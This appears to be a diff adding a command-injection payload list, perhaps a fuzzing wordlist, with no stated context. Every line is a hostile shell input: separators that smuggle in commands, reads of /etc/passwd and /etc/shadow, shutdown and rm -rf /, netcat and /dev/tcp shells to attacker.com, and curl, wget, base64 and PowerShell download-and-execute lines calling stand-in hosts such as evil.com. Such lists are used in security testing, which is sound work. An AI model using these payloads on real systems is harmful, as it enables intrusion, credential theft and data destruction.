@@ -1,0 +1,22 @@
+;cat /etc/passwd
+| ls -la
+&&whoami
+$(id)
+`whoami`
+;shutdown -h now
+%0acat /etc/passwd
+x%0Aid
+&dir
+|nc attacker.com 4444
+curl http://evil.com/sh|sh
+wget -qO- http://x.s/h|bash
+;rm -rf /
+& ping -c 5 attacker.com
+; base64 -d cGF5bG9hZA==|sh
+printf \x2d\x65|sh
+xxd -r /tmp/x|sh
+/bin/bash -c /dev/tcp/attacker.com/4444
+powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x/p')
+; /bin/cat /etc/shadow
+find / -name *.txt;cat /etc/passwd
+| wget http://evil.com/x.sh;chmod +x x.sh
